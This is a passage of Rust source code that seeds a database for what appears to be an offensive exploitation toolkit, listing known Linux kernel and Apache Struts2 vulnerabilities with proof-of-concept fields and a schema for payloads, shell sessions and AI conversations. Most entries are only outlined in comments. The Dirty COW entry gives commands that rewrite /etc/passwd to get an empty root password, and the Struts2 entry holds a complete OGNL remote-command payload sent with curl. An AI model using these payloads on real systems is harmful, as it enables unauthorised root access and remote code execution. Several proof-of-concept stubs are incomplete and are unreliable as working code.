            description: "Use-after-free in Linux Traffic Control cls_route filter allows local privilege escalation to root via heap spray and kernel object manipulation.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel 2.6 - 5.19.6",
            reliability: "excellent",
            poc_code: r#"# CVE-2022-2588 cls_route UAF
import subprocess
# Requires CAP_NET_ADMIN or unprivileged user namespaces
# 1. Create tc filter with route4 classifier
subprocess.run(['ip','netns','add','ns1'])
subprocess.run(['ip','netns','exec','ns1','bash','-c',
  'ip link add dummy0 type dummy && ip link set dummy0 up && '
  'tc qdisc add dev dummy0 root handle 1: fq_codel && '
  'tc filter add dev dummy0 parent 1: ...'
])"#,
        },
        Exploit {
            id: "e021", cve_id: "CVE-2016-5195",
            title: "Dirty COW Race Condition LPE",
            description: "Race condition in Linux kernel's memory subsystem COW (Copy-On-Write) allows unprivileged local users to write to read-only memory mappings.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel 2.6.22 - 4.8.2",
            reliability: "excellent",
            poc_code: r#"# CVE-2016-5195 Dirty COW
gcc -pthread -o dirtycow dirtycow.c -lcrypt
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
# Or use dirtycow2 variant to setuid /tmp/passwd helper
su -  # empty password now works"#,
        },
        Exploit {
            id: "e022", cve_id: "CVE-2021-3490",
            title: "eBPF ALU32 Bounds Tracking Kernel LPE",
            description: "Incorrect bounds tracking for 32-bit ALU operations in the Linux kernel eBPF verifier allows unprivileged LPE.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel 5.7 - 5.11.15",
            reliability: "excellent",
            poc_code: r#"# CVE-2021-3490 eBPF verifier bypass
# Load malicious eBPF program that passes verifier but has OOB access
# Bypasses kernel verifier by exploiting 32-bit ALU bounds confusion
python3 -c "
import ctypes, struct
# Create BPF_PROG_TYPE_SOCKET_FILTER with crafted insns
# ALU32_IMM(BPF_AND, r0, 0xffffffff) confuses verifier tnum bounds
"
# Gains arbitrary kernel R/W → root"#,
        },
        Exploit {
            id: "e023", cve_id: "CVE-2022-0185",
            title: "fsconfig Heap Overflow Kernel LPE",
            description: "Heap overflow in Linux kernel legacy_parse_param() via fsconfig syscall allows local LPE with only CAP_SYS_ADMIN in an unprivileged user namespace.",
            category: "kernel", cvss_score: 8.4, affected: "Linux kernel 5.1 - 5.16.1",
            reliability: "excellent",
            poc_code: r#"# CVE-2022-0185 fsconfig heap overflow
# Requires unprivileged user namespaces (enabled by default on Ubuntu)
# 1. unshare -Urm to gain CAP_SYS_ADMIN in new namespace
# 2. Use fsconfig(FSCONFIG_SET_STRING) to overflow heap buffer
# 3. Overwrite adjacent msg_msg with fake data for arbitrary read/write"#,
        },
        Exploit {
            id: "e024", cve_id: "CVE-2023-0386",
            title: "OverlayFS FUSE LPE",
            description: "Flaw in Linux OverlayFS that allows copying SUID files from FUSE mounts to overlay upper layer without clearing SUID bit, enabling LPE.",
            category: "kernel", cvss_score: 7.8, affected: "Linux kernel 5.15 - 6.2",
            reliability: "excellent",
            poc_code: r#"# CVE-2023-0386 OverlayFS FUSE LPE
# 1. Mount FUSE filesystem with suid binary
# 2. Mount OverlayFS with FUSE as lower, writable as upper
# 3. Copy SUID binary through overlay — SUID bit preserved in upper
# 4. Execute binary from upper layer as non-root → root shell"#,
        },
        Exploit {
            id: "e025", cve_id: "CVE-2017-5638",
            title: "Apache Struts2 OGNL RCE",
            description: "Improper input validation in Jakarta multipart parser allows remote attackers to execute arbitrary OS commands via crafted Content-Type header.",
            category: "web", cvss_score: 10.0, affected: "Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10",
            reliability: "excellent",
            poc_code: r#"# CVE-2017-5638 Apache Struts2 RCE
curl -X POST http://TARGET/struts2-showcase/fileupload/upload.action \
  -H 'Content-Type: %{(#nike="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd.exe","/c",#cmd}:{"/bin/bash","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' \
  -F 'file=@/dev/null'"#,
        },
    ];

    for e in &exploits {
        conn.execute(
            "INSERT INTO exploits (id, cve_id, title, description, category, cvss_score, affected, reliability, poc_code) VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9)",
            rusqlite::params![
                e.id, e.cve_id, e.title, e.description,
                e.category, e.cvss_score, e.affected,
                e.reliability, e.poc_code
            ],
        )?;
    }

    Ok(())
}

const SCHEMA: &str = r#"
PRAGMA journal_mode=WAL;
PRAGMA foreign_keys=ON;

CREATE TABLE IF NOT EXISTS payloads (
  id          TEXT PRIMARY KEY,
  name        TEXT NOT NULL,
  description TEXT,
  category    TEXT,
  platform    TEXT,
  arch        TEXT,
  encoding    TEXT,
  content     BLOB,
  metadata    JSON,
  tags        TEXT,
  author      TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at  DATETIME
);

CREATE TABLE IF NOT EXISTS exploits (
  id          TEXT PRIMARY KEY,
  cve_id      TEXT,
  title       TEXT NOT NULL,
  description TEXT,
  category    TEXT,
  cvss_score  REAL,
  affected    TEXT,
  poc_code    TEXT,
  refs        TEXT,
  reliability TEXT,
  tags        TEXT,
  source_url  TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS projects (
  id          TEXT PRIMARY KEY,
  name        TEXT NOT NULL,
  description TEXT,
  target_arch TEXT,
  target_os   TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
  config      JSON
);

CREATE TABLE IF NOT EXISTS ai_conversations (
  id          TEXT PRIMARY KEY,
  project_id  TEXT REFERENCES projects(id),
  provider    TEXT,
  model       TEXT,
  messages    JSON,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS shell_sessions (
  id          TEXT PRIMARY KEY,
  project_id  TEXT REFERENCES projects(id),
  name        TEXT,
  type        TEXT,
  log         TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS notes (
  id          TEXT PRIMARY KEY,
  project_id  TEXT REFERENCES projects(id),
  title       TEXT,
  content     TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS findings (
  id          TEXT PRIMARY KEY,
  project_id  TEXT REFERENCES projects(id),
  title       TEXT NOT NULL,
  severity    TEXT,
  cvss_score  REAL,
  description TEXT,
  poc         TEXT,
  remediation TEXT,
  status      TEXT,
  cve_id      TEXT,
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);
"#;
